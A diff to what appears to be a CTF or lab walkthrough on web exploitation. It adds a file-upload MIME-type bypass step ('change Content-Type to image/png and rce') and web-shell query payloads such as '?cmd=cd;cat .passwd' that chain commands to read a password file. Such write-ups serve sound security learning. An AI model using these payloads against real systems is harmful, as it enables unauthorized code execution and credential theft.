@@ -86,7 +86,7 @@ Use dirsearch find some interesting files:
 
 With normal request we will get:
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (1).png>)
 
 add Header to request:
 
@@ -125,6 +125,16 @@ set file.php.png and send to the server
 ![](<../.gitbook/assets/image (16).png>)
 
 ```
-?cmd=cd;cat.passwd
+?cmd=cd;cat .passwd
+```
+
+### File upload - MIME type
+
+![](../.gitbook/assets/image.png)
+
+Change Content-Type to image/png and rce
+
+```
+?id=cd;cat .passwd
 ```
 
